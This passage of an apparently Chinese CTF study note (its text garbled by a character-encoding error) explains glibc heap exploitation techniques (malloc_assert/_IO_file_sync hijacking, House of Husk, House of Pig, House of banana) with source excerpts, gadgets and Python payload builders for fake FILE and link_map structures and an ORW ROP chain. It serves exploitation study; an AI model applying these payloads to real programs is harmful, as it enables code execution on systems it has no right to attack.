·ï¼Œéœ€è¦å†è°ƒè¯•çœ‹çœ‹ï¼Œæ¯”å¦‚2.31é‡Œå°±æ˜¯ï¼š\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rdx,QWORD PTR [rdi+0x8]\nmov QWORD PTR [rsp],rax\ncall QWORD PTR [rdx+0x20]\n```\n\nâ‘¡svcudp_reply+26:\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rbp, qword ptr [rdi + 0x48]; \nmov rax, qword ptr [rbp + 0x18]; \nlea r13, [rbp + 0x10]; \nmov dword ptr [rbp + 0x10], 0; \nmov rdi, r13; \ncall qword ptr [rax + 0x28];\n```\n\né€šè¿‡rdiæ§åˆ¶rbpå®ç°æ ˆè¿ç§»ï¼Œç„¶åå³å¯ä»»æ„gadgetäº†ã€‚\n\nå…¶ä¸­2.31ç‰ˆæœ¬ä¸‹è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¦‚ä¸‹ï¼š\n\n```\nplaintext\n\n#æ³¨é‡Šå¤´\n\nmov rbp,QWORD PTR [rdi+0x48]\nmov rax,QWORD PTR [rbp+0x18]\nlea r13,[rbp+0x10]\nmov DWORD PTR [rbp+0x10],0x0\nmov rdi,r13\ncall QWORD PTR [rax+0x28]\n```\n\n### (2)ä¸åŒåŠ«æŒ\n\nè¿™é‡Œè§‚å¯Ÿå¯„å­˜å™¨å°±å¯ä»¥çŸ¥é“ï¼Œä¸åŒç‰ˆæœ¬çš„setcontextå¯¹åº”çš„rdiå’Œrdxï¼Œè¿™é‡Œå°±åŠ«æŒå“ªä¸€ä¸ªã€‚å¦å¤–è¿™é‡Œçš„rdiä¸º`_IO_2_1_stderr`ç»“æ„ä½“ï¼Œæ˜¯é€šè¿‡`_malloc_assert`å‡½æ•°ä¸­çš„\n\n```c\nfflush (stderr);\n```\n\nä»`stderr@@GLIBC_2.2.5`å–å€¼è¿‡æ¥çš„ï¼Œä¹Ÿå°±æ˜¯ELFçš„bssæ®µä¸Šçš„æ•°æ®\n\n```c\n//2.33 /libio/stdio.c\n#include \"libioP.h\"\n#include \"stdio.h\"\n\n#undef stdin\n#undef stdout\n#undef stderr\nFILE *stdin = (FILE *) &_IO_2_1_stdin_;\nFILE *stdout = (FILE *) &_IO_2_1_stdout_;\nFILE *stderr = (FILE *) &_IO_2_1_stderr_;\n```\n\nå¦‚æœå¯ä»¥å–å¾—ELFåŸºåœ°å€ï¼Œç›´æ¥åŠ«æŒè¯¥æŒ‡é’ˆä¸ºchunkåœ°å€ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¿™æ ·å°±èƒ½åŠ«æŒRDIå¯„å­˜å™¨äº†ã€‚\n\n![å›¾ç‰‡1](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210827165944.png)\n\nè¿™æ ·å¦‚æœåŠ«æŒ__IO_file_syncå‡½æ•°æŒ‡é’ˆä¸ºsetcontextï¼Œé…åˆåŠ«æŒçš„rdiå’Œrdxå°±å¯ä»¥æ¥è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨å‡½æ•°ä»è€Œç›´æ¥getshellæˆ–è€…ç»•è¿‡orwã€‚\n\nå¦‚æœæ²¡æ³•æ³„éœ²ELFåŸºåœ°å€ï¼Œå¯ä»¥åˆ©ç”¨`largebin attack`ç›´æ¥å°†å †åœ°å€å†™å…¥`_IO_2_1_stderr`çš„`vtable`æŒ‡é’ˆï¼Œç„¶ååœ¨å †ä¸Šä¼ªé€ `_IO_new_file_sync`å‡½æ•°æŒ‡é’ˆä¸º`one_gadget`å³å¯ã€‚\n\n## ğŸ”ºé—®é¢˜ï¼š\n\nå½“ç¨‹åºä¸­æ— æ³•æ³„éœ²ELFåŸºåœ°å€æ—¶ï¼Œè€Œ`one_gadget`\n\n## 2.è§¦å‘æ¡ä»¶\n\nåªè¦assertåˆ¤æ–­å‡ºé”™éƒ½å¯ä»¥ï¼Œå¸¸ç”¨ä»¥ä¸‹å‡ ä¸ª\n\n(1)top_chunkæ”¹å°ï¼Œå¹¶ç½®pre_inuseä¸º0ï¼Œå½“top_chunkä¸è¶³åˆ†é…æ—¶ä¼šè§¦å‘ä¸€ä¸ªassertã€‚(è¯¥assertå‡½æ•°åœ¨sysmallocå‡½æ•°ä¸­è¢«è°ƒç”¨)\n\n![Snipaste_2021-08-28_11-56-34](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828115642.png)\n\n(2)largebin chunkçš„sizeä¸­\n\nå½“ä¿®æ”¹largebinä¸­çš„chunkçš„sizeä½æ—¶ï¼Œå°†ä¹‹æ”¹å°ã€‚å†ä»largebinä¸­å°è¯•ç”³è¯·chunkçš„æ—¶å€™ï¼Œå¦‚æœå‘ç°largebinä¸­çš„chunkçš„sizeå°äºéœ€è¦ç”³è¯·çš„chunkçš„sizeï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘`assert`\n\n```c\n//2.33  _int_malloc\nsize = chunksize (victim);\n//è¿™ä¸ªsizeå³ä¸ºlargebinä¸­çš„chunkçš„size,nbä¸ºéœ€è¦ç”³è¯·çš„chunkçš„size\n/*  We know the first chunk in this bin is big enough to use. */\nassert ((unsigned long) (size) >= (unsigned long) (nb));\n```\n\n(3)å¦‚æœæ˜¯2.29åŠä»¥ä¸‹ï¼Œå› ä¸ºåœ¨tcache_putå’Œtcache_getä¸­è¿˜å­˜åœ¨assertçš„å…³ç³»ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥ä¿®æ”¹æ‰mp_.tcache_binsï¼Œå°†ä¹‹æ”¹å¤§ï¼Œ(åˆ©ç”¨largebin attack)å°±ä¼šè§¦å‘assert\n\n```c\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\n![Snipaste_2021-08-28_11-46-59](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828114858.png)\n\næ­¤å¤–åªè¦æ˜¯assertä¸æ»¡è¶³å‡å¯ï¼Œå¯ä»¥åœ¨`_int_malloc`å’Œ`_int_free`å‡½æ•°ä¸­æ‰¾ä¸€æ‰¾ã€‚\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nå¦‚æœå°†`exit`å‡½æ•°æ›¿æ¢æˆ`_exit`å‡½æ•°,æœ€ç»ˆç»“æŸçš„æ—¶å€™,åˆ™æ˜¯è¿›è¡Œäº†syscallæ¥ç»“æŸ,å¹¶æ²¡æœ‰æœºä¼šè°ƒç”¨`_IO_cleanup`,è‹¥å†å°†`__malloc_hook`å’Œ`__free_hook`ç»™banäº†,ä¸”åœ¨è¾“å…¥å’Œè¾“å‡ºéƒ½ç”¨readå’Œwriteçš„æƒ…å†µä¸‹,æ— æ³•hookä¸”æ— æ³•é€šè¿‡IOåˆ·æ–°ç¼“å†²åŒºçš„æƒ…å†µä¸‹ã€‚è¿™æ—¶å€™å¯ä»¥å€Ÿç”¨mallocå‡ºé”™è°ƒç”¨**malloc_assert->fflush->_IO_file_sync**å‡½æ•°æŒ‡é’ˆã€‚ä¸”è¿›å…¥çš„æ—¶å€™rdxä¸º`_IO_helper_jumps_addr`ï¼Œrdiä¸º`_IO_2_1_stderr_addr`ã€‚\n\n\n\n# äºŒã€House of Husk\n\n[house-of-huskå­¦ä¹ ç¬”è®° (juejin.cn)](https://juejin.cn/post/6844904117119385614)\n\n## **1**.åŸç†åˆ†æ\n\nå‡½æ•°è°ƒç”¨é“¾:\n\n```c\nprintf->vfprintf->printf_positional->__parse_one_specmb->__printf_arginfo_table(spec)\n\t\t\t\t\t\t\t\t\t\t\t\t|\n    \t\t\t\t\t\t\t\t\t\t\t ->__printf_function_table(spec)\n```\n\n**__parse_one_specmb** å‡½æ•° ä¼šè°ƒç”¨ **__printf_arginfo_table**å’Œ**__printf_function_table**ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆä¸­å¯¹åº”specç´¢å¼•çš„å‡½æ•°æŒ‡é’ˆ**printf_arginfo_size_function**\n\nâ–²è¿™ä¸ªspecç´¢å¼•æŒ‡é’ˆå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦çš„asciiç å€¼ï¼Œæ¯”å¦‚printf(\"%S\")ï¼Œé‚£ä¹ˆå°±æ˜¯Sçš„asciiç å€¼ã€‚å½“ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•çš„å‰ææ˜¯å¾—æœ‰printfç³»åˆ—å‡½æ•°ï¼Œå¹¶ä¸”æœ‰æ ¼å¼åŒ–å­—ç¬¦ã€‚\n\nå³è°ƒç”¨**(*__printf_arginfo_table+'spec'8) å’Œ  (*printf_function_table+'spec'8)**è¿™ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆã€‚\n\nè€Œå®é™…æƒ…å†µä¼šå…ˆè°ƒç”¨**__printf_arginfo_table**ä¸­å¯¹åº”çš„specç´¢å¼•çš„å‡½æ•°æŒ‡é’ˆï¼Œç„¶åè°ƒç”¨**__printf_function_table**å¯¹åº”specç´¢å¼•å‡½æ•°æŒ‡é’ˆã€‚\n\næ‰€ä»¥å¦‚æœä¿®æ”¹äº†**__printf_arginfo_table**å’Œ**__printf_function_table**ï¼Œåˆ™éœ€è¦ç¡®ä¿å¯¹åº”çš„specç´¢å¼•å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œè¦ä¹ˆä¸º0ï¼Œè¦ä¹ˆæœ‰æ•ˆã€‚\n\nåŒæ—¶å¦‚æœé€‰æ‹©è¿™ä¸ªæ–¹æ³•ï¼Œå°±å¾—éœ€è¦**__printf_arginfo_table**å’Œ**__printf_function_table**å‡ä¸ä¸º0æ‰è¡Œã€‚\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n/* Use the slow path in case any printf handler is registered.  */\nif (__glibc_unlikely (__printf_function_table != NULL\n                      || __printf_modifier_table != NULL\n                      || __printf_va_arg_table != NULL))\n    goto do_positional;\n\n\ndo_positional:\nif (__glibc_unlikely (workstart != NULL))\n{\n    free (workstart);\n    workstart = NULL;\n}\ndone = printf_positional (s, format, readonly_format, ap, &ap_save,\n                          done, nspecs_done, lead_str_end, work_buffer,\n                          save_errno, grouping, thousands_sep, mode_flags);\n```\n\n```c\n//2.31 vfprintf-internal.c(stdio-common)\n\n(void) (*__printf_arginfo_table[specs[cnt].info.spec])\n(&specs[cnt].info,\n specs[cnt].ndata_args, &args_type[specs[cnt].data_arg],\n &args_size[specs[cnt].data_arg]);\n\n\n/* Call the function.  */\nfunction_done = __printf_function_table[(size_t) spec]\n    (s, &specs[nspecs_done].info, ptr);\n```\n\nå³å¦‚æœtableä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨`printf_positional`å‡½æ•°ï¼Œç„¶åå¦‚æœspecä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨å¯¹åº”specç´¢å¼•å‡½æ•°ã€‚ä½†æ˜¯æœ‰æ—¶å€™ä¸çŸ¥é“printfæœ€ç»ˆä¼šè°ƒç”¨å“ªä¸ªspecï¼Œå¯èƒ½éšè—åœ¨å“ªï¼Œæ‰€ä»¥ç›´æ¥æŠŠå¹²è„†`_printf_arginfo_table`å’Œ`__printf_function_table`ä¸­çš„å€¼å…¨ç»™æ”¹æˆone_gadgetç®—äº†ã€‚\n\nâ–²ç»¼ä¸Šï¼Œå¾—å‡ºä»¥ä¸‹æ¡ä»¶ï¼š\n\n```C\nA.\t__printf_function_table = heap_addr \n\t__printf_arginfo_table != 0\n//å…¶ä¸­__printf_arginfo_tableå’Œ__printf_function_tableå¯ä»¥å¯¹è°ƒ\nB. heap_addr+'spec'*8 = one_gadget\n```\n\n![å›¾ç‰‡1](https://i.loli.net/2021/08/20/23CGNn46r5xEgJy.png)\n\nåœ¨2.29ä¸‹å¯ä»¥ç›´æ¥ç”¨largebin attackçˆ†ç ´ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼Œå½“ç„¶è¿˜æ˜¯éœ€è¦å…ˆæ³„éœ²åœ°å€çš„ã€‚\n\n## 2.è§¦å‘æ¡ä»¶\n\nå³éœ€è¦printfå®¶æ—å‡½æ•°è¢«è°ƒç”¨ï¼Œä¸”å…¶ä¸­éœ€å¸¦ä¸Šæ ¼å¼åŒ–å­—ç¬¦ï¼Œæ¯”å¦‚%sï¼Œ%xç­‰ï¼Œç”¨æ¥è®¡ç®—specï¼Œè¿™ä¸ªå’Œlibcç‰ˆæœ¬æ— å…³ï¼Œç›¸å½“äºåªé’ˆå¯¹printfå®¶æ—å‡½æ•°è¿›è¡Œæ”»å‡»çš„ã€‚\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nå…·æœ‰printfå®¶æ—å‡½æ•°ï¼Œå¹¶ä¸”å­˜åœ¨specï¼Œåˆé€‚åœ°æ–¹ä¼šè°ƒç”¨ã€‚\n\n\n\n# ä¸‰ã€House of Pig\n\n[house of pigä¸€ä¸ªæ–°çš„å †åˆ©ç”¨è¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n## 1.åŸç†åˆ†æ\n\n### (1)åŠ«æŒåŸç†\n\n**_IO_str_overflow**å‡½æ•°ä¸­ä¼šè¿ç»­è°ƒç”¨**malloc memcpy free**ä¸‰ä¸ªå‡½æ•°ã€‚å¹¶ä¸”**__IO_str_overflow**å‡½æ•°ä¼ å…¥çš„å‚æ•°rdiä¸ºä»**_IO_list_all**ä¸­è·å–çš„**_IO_2_1_stderr**ç»“æ„ä½“çš„åœ°å€ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½æ”¹æ‰**_IO_list_all**ä¸­çš„å€¼å°±èƒ½åŠ«æŒè¿›å…¥è¯¥å‡½æ•°çš„å‚æ•°`rdi`ã€‚\n\n![Snipaste_2021-08-28_17-15-06](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828171517.png)\n\næ‰€ä»¥å¦‚ä¸Šæ‰€ç¤ºï¼Œå³åŠ«æŒæˆåŠŸã€‚\n\n### (2)GetshellåŸç†\n\n#### â‘ å‡½æ•°æµç¨‹\n\nA.åœ¨`_IO_str_overflow`å‡½æ•°ä¸­ä¼šå…ˆç”³è¯·chunkä¸º`new_buf`ï¼Œç„¶åä¼šä¾æ®`rdi`çš„å€¼ï¼Œå°†`rdi`å½“ä½œ`_IO_FILE`ç»“æ„ä½“ï¼Œä»è¯¥ç»“æ„ä½“ä¸­è·å–`_IO_buf_base`å½“ä½œ`old_buf`ã€‚\n\nB.ä¾æ®`old_blen` å’Œ`_IO_buf_base`æ¥æ‹·è´æ•°æ®åˆ°`new_buf`ä¸­ï¼Œç„¶åé‡Šæ”¾æ‰`old_buf`ã€‚å…¶ä¸­`old_blen` æ˜¯é€šè¿‡`_IO_buf_end`å‡å»`_IO_buf_base`å¾—åˆ°çš„ã€‚\n\n```c\n//2.31 strops.cä¸­çš„_IO_str_overflow\nif (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */\n    return EOF;\nelse\n{\n    char *new_buf;\n    char *old_buf = fp->_IO_buf_base;\n    size_t old_blen = _IO_blen (fp);\n    size_t new_size = 2 * old_blen + 100;\n    if (new_size < old_blen)\n        return EOF;\n    new_buf = malloc (new_size);//-------house of pig:get chunk from tcache\n    if (new_buf == NULL)\n    {\n        /*\t  __ferror(fp) = 1; */\n        return EOF;\n    }\n    if (old_buf)\n    {\n        memcpy (new_buf, old_buf, old_blen);\n        //-------house of pig:copy /bin/sh and system to _free_hook\n        free (old_buf);\t\t//-------house of pig:getshell\n        /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n        fp->_IO_buf_base = NULL;\n    }\n```\n\n\n\n![Snipaste_2021-08-28_17-30-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210828173049.png)\n\n#### â‘¡åŠ«æŒæ‰€éœ€æ•°æ®\n\næ‰€ä»¥å¦‚æœåœ¨ç”³è¯·çš„`new_buf`åŒ…å«ä¸º`_free_hook`ï¼Œç„¶åæˆ‘ä»¬åœ¨`_IO_buf_base`å’Œ`_IO_buf_end`è¿™é‡Œä¸€æ®µæ•°æ®å—ä¸­å°†`system_addr`æ”¾å…¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†`system_addr`æ‹·è´åˆ°`_free_hook`ä¸­ã€‚ä¹‹åé‡Šæ”¾æ‰`old_buf`ï¼Œå¦‚æœ`old_buf`ä¸­çš„å¤´éƒ¨æ•°æ®ä¸º`/bin/sh\\x00`ï¼Œé‚£ä¹ˆå°±èƒ½ç›´æ¥**getshell**äº†ã€‚å¾—åˆ°ä»¥ä¸‹åŠ«æŒæ‰€éœ€æ•°æ®ï¼š\n\n```c\n*(_IO_list_all) = chunk_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_base = chunk_sh_sys_addr;\n(struct _IO_FILE*)chunk_addr->_IO_buf_end = chunk_sh_sys_addr+old_blen;\n//2 * old_blen + 100 é€šå¸¸æˆ‘ä»¬é€‰å–old_blenä¸º0x18ï¼Œé‚£ä¹ˆè®¡ç®—å¾—åˆ°çš„tc_idxä¸º8\ntcachebin[tc_idx] = _free_hook_addr-old_blen;\n```\n\nä½†æ˜¯å¦‚ä½•ä½¿å¾—tcachebin[tc_idx]ä¸­çš„Chunkä¸º`_free_hook_addr-old_blen`å‘¢ï¼Œè¿™ä¸ªå°±ç”¨åˆ°æŠ€æœ¯\n\n`Largebin attack + Tcache Stashing Unlink Attack`ï¼Œè¿™ä¸ªæŠ€æœ¯åŸç†æ¯”è¾ƒå¤æ‚ï¼Œè‡ªå·±çœ‹å§ã€‚\n\n**é€šå¸¸æ˜¯åªèƒ½ä½¿ç”¨calloçš„æƒ…å†µä¸‹æ¥ç”¨çš„ï¼Œå› ä¸ºå¦‚æœèƒ½mallocé‚£ç›´æ¥ä»tcacheä¸­mallocå‡ºæ¥ä¸å°±å®Œäº†ã€‚**\n\nç„¶åç”±äº`_IO_str_overflow`å‡½æ•°ä¸­çš„ä¸€äº›æ£€æŸ¥ï¼Œæ‰€ä»¥æœ‰çš„åœ°æ–¹è¿˜æ˜¯éœ€è¦ä¿®æ”¹çš„ï¼š\n\n```python\nfake_IO_FILE = p64(0)*2\nfake_IO_FILE += p64(1)                     #change _IO_write_base = 1\nfake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff\nfake_IO_FILE += p64(0)\n#need copy '/bin/sh' and system from a old_buf to new_buf\nfake_IO_FILE += p64(heap_base+0x003900+0x10)       #set _IO_buf_base (old_buf(start))\nfake_IO_FILE += p64(heap_base+0x003900+0x10+0x18)  #set _IO_buf_end  (old_buf(end))   \n#old_blen=old_buf(start)-old_buf(end)\nfake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\\x00')\nfake_IO_FILE += p64(0)                    #change _mode = 0\nfake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\\x00')\nfake_IO_FILE += p64(IO_str_vtable)        #change vtable to _IO_str_jumps\n```\n\n## 2.è§¦å‘æ¡ä»¶\n\n(1)Libcç»“æ„è¢«ç ´åçš„abortå‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ·æ–°\n(2)è°ƒç”¨exit()\n(3)èƒ½å¤Ÿä»mainå‡½æ•°è¿”å›\n\n## 3.é€‚ç”¨æ¡ä»¶\n\nç¨‹åºåªèƒ½é€šè¿‡callocæ¥è·å–chunkæ—¶\n\n\n\n# å››ã€House of banana\n\n[house of banana - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\n[main_arenaåŠ«æŒåŠlink_mapåŠ«æŒ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/211331)\n\n## 1.åŸç†åˆ†æ\n\nå‡½æ•°è°ƒç”¨é“¾ï¼š**exit()->_dl_fini->(fini_t)array[i]**\n\n```c\n//2.31 glibc/elf/dl_fini.c\n\n/* First see whether an array is given.  */\nif (l->l_info[DT_FINI_ARRAY] != NULL)\n{\n    ElfW(Addr) *array =\n        (ElfW(Addr) *) (l->l_addr\n                        + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);\n    unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val\n                      / sizeof (ElfW(Addr)));\n    while (i-- > 0)\n        ((fini_t) array[i]) ();\n}\n```\n\næ‰€ä»¥å¦‚æœå¯ä»¥ä½¿å¾—*array[i] = one_gadgetï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¸€é”®getshellã€‚è€Œarray[i]è°ƒç”¨æ—¶è¿™é‡Œå°±æœ‰ä¸¤ç§å¥—è·¯ï¼š\n\n### (1)ä¼ªé€ link_mapç»“æ„ä½“\n\nç›´æ¥ä¼ªé€ `link_map`ç»“æ„ä½“ï¼Œå°†åŸæœ¬æŒ‡å‘`link_map`çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„`link_map`ï¼Œç„¶åä¼ªé€ å…¶ä¸­æ•°æ®ï¼Œç»•è¿‡æ£€æŸ¥ï¼Œæœ€åè°ƒç”¨array[i]ã€‚è¿™é‡Œé€šå¸¸åˆ©ç”¨largebin attackæ¥å°†å †åœ°å€å†™åˆ°`_rtld_global`è¿™ä¸ªç»“æ„ä½“æŒ‡é’ˆä¸­ã€‚\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830185253.png)\n\n`link_map`çš„å¸ƒå±€é€šå¸¸å¦‚ä¸‹ï¼š\n\n```python\n#largebin attack's chunk\n#*_rtld_local=fake_link_map_chunk_addr\nfake_link_map_chunk_addr = heap_base+0x001000\nedit(1,0x448,'\\x00'*0x448)  #empty the fake_link_map_chunk\nfake_link_map_data = \"\"\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x20)\t\t#0 1\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr)\t\t\t#2 3\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x28)\t\t#4 5\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x50) + p64(fake_link_map_chunk_addr + 0x20)\t\t\t\t\t\t\t\t\t \n#6 7\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x28) + p64(0x0)\t\t#8 9\nfake_link_map_data += p64(0) + p64(0x0)\t\t\t\t\t\t\t\t\t#10 11\nfake_link_map_data += p64(0) + p64(fake_link_map_chunk_addr + 0x50)\t\t#12 13\nfake_link_map_data =  fake_link_map_data.ljust(0x100,'\\x00')\n\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x190) + p64(0)\t\t\t\n#0x20 0x21\nfake_link_map_data += p64(fake_link_map_chunk_addr + 0x128) + p64(0)\t\t\n#0x22 0x23\nfake_link_map_data += p64(0x8) + p64(0)\t\t\t\t\t\t\t\t\t#0x24 0x25\nfake_link_map_data =  fake_link_map_data.ljust(0x180,'\\x00')\n\nfake_link_map_data += p64(0x1A) + p64(0x0)\t\t\t\t\t\t\t\t#0x30 0x31\nfake_link_map_data += p64(elf_base + elf.sym['backdoor']) + p64(0)\t\t#0x32 0x33\n\n#set fake_chunk->pre_size\nedit(0,0xd68,'\\x00'*0xd60+p64(fake_link_map_chunk_addr + 0x1a0))\nfake_link_map_data = fake_link_map_data.ljust(0x308,'\\x00')\nfake_link_map_data += p64(0x800000000)\n```\n\n![Snipaste_2021-08-29_09-49-17](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830212809.png)\n\n### (2)ä¿®æ”¹link_mapç»“æ„ä½“æ•°æ®\n\nä¿®æ”¹å¯¹åº”link_mapç»“æ„ä½“ä¸­çš„æ•°æ®ï¼Œç»•è¿‡æ£€æŸ¥ï¼Œæœ€ç»ˆè°ƒç”¨array[i]ã€‚è¿™é‡Œå°±é€šå¸¸éœ€è¦åˆ©ç”¨ä»»æ„ç”³è¯·æ¥ç”³è¯·åˆ°è¯¥ç»“æ„ä½“ï¼Œç„¶åä¿®æ”¹å…¶ä¸­çš„å€¼ï¼Œå› ä¸ºå½“è°ƒç”¨array[i]æ—¶ï¼Œä¼ å…¥çš„å®é™…ä¸Šæ˜¯link_mapä¸­çš„æŸä¸ªåœ°å€ï¼Œå³rdxä¸ºlink_map+0x30ï¼Œè¿™ä¸ªä¸åŒç‰ˆæœ¬å¥½åƒä¸å¤ªä¸€æ ·ï¼Œ2.31åŠä»¥ä¸Šä¸ºlink_map+0x38ã€‚\n\nä¸»è¦ä¼ªé€ ä»¥ä¸‹æ•°æ®ï¼š\n\n![Snipaste_2021-08-30_18-56-38](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830191318.png)\n\nè¿™ä¸ªæ–¹æ³•å¸¸ç”¨æ¥æ‰“ORWï¼Œå› ä¸ºå¯ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ROPé“¾å¸ƒç½®åœ¨link_mapä¸­ã€‚ç„¶è€Œå› ä¸ºç‰ˆæœ¬é—´çš„å…³ç³»ï¼Œæ‰€ä»¥æ•°æ®ä¹Ÿæœ‰ç‚¹ä¸åŒï¼Œå®é™…å¸ƒå±€ï¼š\n\n#### 2.31\n\n![Snipaste_2021-08-30_18-49-43](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830184953.png)\n\n```python\n//docker 2.31 gadget\npop_rdi_ret = libc_base + 0x0000000000026b72;\npop_rsi_ret = libc_base + 0x0000000000027529;\npop_rax_ret = libc_base + 0x000000000004a550;\nsyscall_ret = libc_base + 0x0000000000066229;\npop_rdx_r10_ret = libc_base + 0x000000000011c371\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + p64(0x0)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5b0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+61) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(0x0) + p64(fake_rsp)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(ret) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\n\n\n#### 2.29\n\n![Snipaste_2021-08-30_16-16-41](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210830161702.png)\n\n```python\n//docker 2.29 gadget\npop_rdi_ret = libc_base + 0x0000000000026542;\npop_rsi_ret = libc_base + 0x0000000000026f9e;\npop_rax_ret = libc_base + 0x0000000000047cf8;\nsyscall_ret = libc_base + 0x00000000000cf6c5;\npop_rdx_r10_ret = libc_base + 0x000000000012bda4\nsetcontext_addr = libc_base + libc.sym['setcontext']\nlg(\"setcontext_addr\",setcontext_addr)\nret = pop_rdi_ret+1;\n\n\nfake_link_map_chunk_addr = top_chunk_hijack+0x4+0x10\nfake_rsp = fake_link_map_chunk_addr + 8*8\nflag = fake_link_map_chunk_addr + 30*8\n\norw = \"\"\n#fake_rsp_addr =  fake_link_map_chunk_addr + 8*8\norw += p64(pop_rdi_ret) + p64(flag)\t\t\t\t\t\t\t\t\t\t#8\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_r10_ret) + p64(0x30) + 